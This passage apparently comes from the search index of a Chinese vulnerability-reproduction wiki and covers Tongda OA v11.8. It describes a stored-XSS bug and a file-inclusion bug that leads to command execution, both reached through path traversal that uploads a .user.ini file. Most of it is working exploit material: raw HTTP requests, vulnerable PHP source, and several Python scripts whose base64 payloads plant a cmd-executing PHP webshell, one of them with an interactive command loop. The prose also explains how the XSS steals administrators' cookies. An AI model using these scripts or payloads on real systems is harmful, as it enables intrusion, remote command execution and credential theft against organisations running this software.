filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log \u8fd9\u91cc\u62fc\u63a5\u540e\u4e0a\u4f20\u5c31\u53d8\u6210\u4e86 .user.ini \u8fd9\u91cc\u518d\u4e0a\u4f20 XSS\u6587\u4ef6 peiqi.log \u88ab\u5305\u542b\u8fdb\u53bb \u4e0a\u4f20\u540e\u6bcf\u6b21\u7ba1\u7406\u5458\u767b\u5f55\u540e\u90fd\u4f1a\u5e26\u7740Cookie\u8bf7\u6c42\u4e00\u6b21XSS\u5e73\u53f0 \u9493\u9c7c\u4ec0\u4e48\u7684\u4ee3\u7801\u5199\u5728peiqi.log\u6587\u4ef6\u91cc\u5c31\u597d\u5566 \u521a\u521a\u63d0\u5230\u4e86 v11.7\u7248\u672c\u4e0d\u65b9\u4fbf\u5229\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u540e\u7eed\u7248\u672c\u52a0\u4e0a\u4e86\u6587\u4ef6\u4e0a\u4f20\u7684\u89c4\u5b9a\u8def\u5f84 if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } \u8def\u5f84\u4e2d\u5fc5\u987b\u8981\u5305\u542b webroot \u548c attachment \u624d\u53ef\u4ee5\u4e0a\u4f20 \u8fd9\u91ccXSS\u7684\u5229\u7528\u70b9\u67094\u4e2a\u6587\u4ef6\u5939\uff0c\u5176\u4e2d\u6700\u6709\u51e0\u7387XSS\u7684\u4e3a**\u5b58\u50a8\u76ee\u5f55\u7ba1\u7406\u7684\u6587\u4ef6\u5939** \u7528\u540c\u6837\u7684\u65b9\u6cd5\u4e0a\u4f20\u5229\u7528\u6587\u4ef6\uff0c\u6bcf\u6b21\u5f53\u7ba1\u7406\u5458\u8bbe\u7f6e\u65f6\u5c31\u4f1a\u76d7\u53d6Cookie","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"\u56e0\u4e3a\u662fxss\u53ef\u80fd\u5bf9\u76ee\u6807\u6709\u5f71\u54cd\uff0c\u6240\u4ee5\u8fd9\u91ccPOC\u5728\u4e00\u4e2a\u4e0d\u5e38\u7528\u76ee\u5f55\u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e Cookie\u586b\u5199\u8bbf\u95ee\u540e\u53f0\u65f6\u7684Cookie, \u5176\u4e2d\u7684base64\u89e3\u7801\u66f4\u6539 PeiQi_Wiki\u4e3a \u81ea\u5df1\u7684XSS\u8bed\u53e5 v11.6\u53ca\u4ee5\u4e0b \u653b\u51fb /general \u548c /general/system/attachment \u76ee\u5f55\u8f83\u597d v11.6\u4ee5\u4e0a \u653b\u51fb /general/system/attachment \u76ee\u5f55\u8f83\u597d import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki,\u5b58\u5728XSS\u6f0f\u6d1e, \u53ef\u53c2\u8003\u6587\u7ae0\u5199\u7684\u5229\u7528\u7248\u672c\u8fdb\u4e00\u6b65\u653b\u51fb \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1 ( target_url , Cookie )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABXSS%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://paper.seebug.org/1499/","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u901a\u8fbeOA v11.8\u4ee5\u4e0b\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\uff0c\u53ef\u4e0a\u4f20 .user.ini \u6587\u4ef6\u5305\u542b\u6709PHP\u8bed\u53e5\u7684\u6587\u4ef6\u5bfc\u81f4\u547d\u4ee4\u6267\u884c \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u901a\u8fbeOA < v11.8 \u73af\u5883\u642d\u5efa \u00b6 \u901a\u8fbeOA v11.6\u4e0b\u8f7d\u94fe\u63a5 \u4e0b\u8f7d\u5b8c\u6bd5\u70b9\u51fb\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd9\u91cc\u4f7f\u7528\u7684\u73af\u5883\u4e3a\u901a\u8fbe v11.6\u7248\u672c \u51fa\u73b0\u6f0f\u6d1e\u7684\u6587\u4ef6\u4e3a webroot/general/hr/manage/staff_info/update.php <?php include_once \"inc/auth.inc.php\" ; include_once \"inc/utility_all.php\" ; include_once \"inc/utility_file.php\" ; include_once \"inc/utility_field.php\" ; include_once \"inc/utility_cache.php\" ; include_once \"general/system/log/annual_leave_log.php\" ; if ( strstr ( $BYNAME , \"/\" ) || strstr ( $BYNAME , \" \\\\ \" ) || strstr ( $BYNAME , \"..\" )) { Message ( _ ( \"\u9519\u8bef\" ), _ ( \"OA\u7528\u6237\u540d\u5305\u542b\u975e\u6cd5\u5b57\u7b26\uff01\" )); exit (); } include_once \"inc/header.inc.php\" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; echo \" \\r\\n <body class= \\\" bodycolor \\\" > \\r\\n \" ; $PHOTO_NAME0 = $_FILES [ \"ATTACHMENT\" ][ \"name\" ]; $ATTACHMENT = $_FILES [ \"ATTACHMENT\" ][ \"tmp_name\" ]; if ( $PHOTO_NAME0 != \"\" ) { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\" ; if ( ! file_exists ( $FULL_PATH )) { @ mkdir ( $FULL_PATH , 448 ); } $PHOTO_NAME = $USER_ID . substr ( $PHOTO_NAME0 , strrpos ( $PHOTO_NAME0 , \".\" )); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME ; td_copy ( $ATTACHMENT , $FILENAME ); if ( file_exists ( $ATTACHMENT )) { unlink ( $ATTACHMENT ); } if ( ! file_exists ( $FILENAME )) { Message ( _ ( \"\u9644\u4ef6\u4e0a\u4f20\u5931\u8d25\" ), _ ( \"\u539f\u56e0\uff1a\u9644\u4ef6\u6587\u4ef6\u4e3a\u7a7a\u6216\u6587\u4ef6\u540d\u592a\u957f\uff0c\u6216\u9644\u4ef6\u5927\u4e8e30\u5146\u5b57\u8282\uff0c\u6216\u6587\u4ef6\u8def\u5f84\u4e0d\u5b58\u5728\uff01\" )); Button_Back (); exit (); } } \u5728\u8fd9\u91cc\u53c2\u6570 $USER_ID \u662f\u53ef\u63a7\u7684\uff0c\u5e76\u4e14\u65e0\u8fc7\u6ee4\u5371\u9669\u7b26\u53f7\u5c31\u62fc\u63a5\u8fdb\u53bb\u4e86\uff0c\u90a3\u6211\u4eec\u4f20\u5165 ../../../ \u6211\u4eec\u5c31\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u4e86 \u7531\u4e8e\u901a\u8fbeOA \u7684\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u7684\u6b7b\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5229\u7528 PHP\u7684 .user.ini \u6587\u4ef6\u6765\u5305\u542b\u5176\u4ed6\u6587\u4ef6\uff0c\u8fd9\u91cc\u662f\u53ef\u4ee5\u7528\u4e8e\u5305\u542bPHP\u8bed\u53e5\u7684\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u4e0a\u4f20\u6587\u4ef6\u5185\u5bb9\u4e3a auto_prepend_file=peiqi.log \u8bf7\u6c42\u5305\u4e3a POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" \u63d0\u4ea4 -----------------------------17518323986548992951984057104-- \u5176\u4e2d USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \u4e3a\u4e0a\u4f20\u8def\u5f84 \u5173\u4e8e\u66f4\u591a\u539f\u7406\u53c2\u8003 http://wiki.peiqi.tech \u4e2d\u7684\u53e6\u4e00\u7bc7 \u901a\u8fbeOA v11.8 \u540e\u53f0\u6587\u4ef6\u5305\u542b\u5b58\u50a8\u578bXSS\u6f0f\u6d1e \u8fd9\u91cc\u6211\u4eec\u7b80\u5355\u77e5\u9053\u4e86\u4e0a\u4f20\u65b9\u5f0f\uff0c\u90a3\u6211\u4eec\u5c31\u901a\u8fc7 .user.ini\u6587\u4ef6 \u5305\u542b\u6076\u610f\u6587\u4ef6 \u73b0\u5728\u5df2\u7ecf\u6210\u529f\u4e0a\u4f20\u4e86\u6076\u610f\u6587\u4ef6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig \u6587\u4ef6\u5305\u542b\u547d\u4ee4\u6267\u884c [!NOTE] \u5728 v11.6\u4e2d \u4e0a\u4f20\u7684\u4f4d\u7f6e\u5e76\u6ca1\u6709\u9650\u5b9a\u6240\u4ee5\u53ef\u4ee5\u4e0a\u4f20\u5728\u65b9\u4fbf\u8bbf\u95ee\u7684\u76ee\u5f55(\u4e0d\u9700\u8981\u767b\u5f55) \u800c v11.8\u4e2d\u5219\u6709\u76ee\u5f55\u540d\u7684\u9650\u5236\u9700\u8981\u76ee\u5f55\u5e26\u6709 webroot \u548c attachment \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u811a\u672c\u5728 v11.6 \u6d4b\u8bd5\u6210\u529f\u6267\u884c\uff0c \u5728 v11.6\u4ee5\u4e0a\u6267\u884c\u65f6 \u8fd9\u4e2awebshell\u65e0\u6cd5\u6267\u884c\u547d\u4ee4 v11.7 v11.8\u53ef\u7528\u8681\u5251\u63d2\u4ef6\u7ed5\u8fc7\u8fde\u63a5webshell import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20.user.ini\u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_2 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20.user.ini\u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , Cookie ): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" , \"Accept-Language\" : \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"Content-Type\" : \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\" , \"Connection\" : \"close\" , \"Cookie\" : Cookie , \"Upgrade-Insecure-Requests\" : \"1\" , } data = base64 . b64decode ( \"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwCmVjaG8gIlBlaVFpX1dpa2kiOwokY29tbWFuZD0kX0dFVFsncGVpcWknXTsKJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiRzdGRvdXQgPSAkZXhlYy0+U3RkT3V0KCk7CiRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CmVjaG8gJHN0cm91dHB1dDsKPz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\" ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033 [0m\" . format ( target_url )) if \"\u6863\u6848\u5df2\u4fdd\u5b58\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 peiqi.log \u6587\u4ef6, \\033 [0m\" . format ( target_url )) POC_3 ( target_url , Cookie ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0a\u4f20 peiqi.log \u6587\u4ef6\u5931\u8d25 \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , Cookie ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=dir\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42 {} /general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033 [0m\" . format ( target_url )) if \"PeiQi_Wiki\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u5305\u542b PeiQi_Wiki,\u5b58\u5728\u6f0f\u6d1e,\u6267\u884cdir \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( response . text )) while True : cmd = str ( input ( \" \\033 [36mCmd >>> \\033 [0m\" )) POC_4 ( target_url , Cookie , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u54cd\u5e94\u4e2d\u4e0d\u5305\u542b PeiQi_Wiki \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_4 ( target_url , Cookie , cmd ): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi= {} \" . format ( cmd ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : Cookie , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a: {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1 ( target_url , Cookie ) [!NOTE] v11.8\u53ca\u4ee5\u4e0b\u53ef\u8fde\u63a5\u8681\u5251\u751f\u6210\u7684webshell\u63a7\u5236,\u4e14\u751f\u6210\u540e\u4e0d\u9700\u8981\u7ba1\u7406\u5458Cookie\u5373\u53ef\u8fde\u63a5 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u901a\u8fbeOA < V11.8 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> 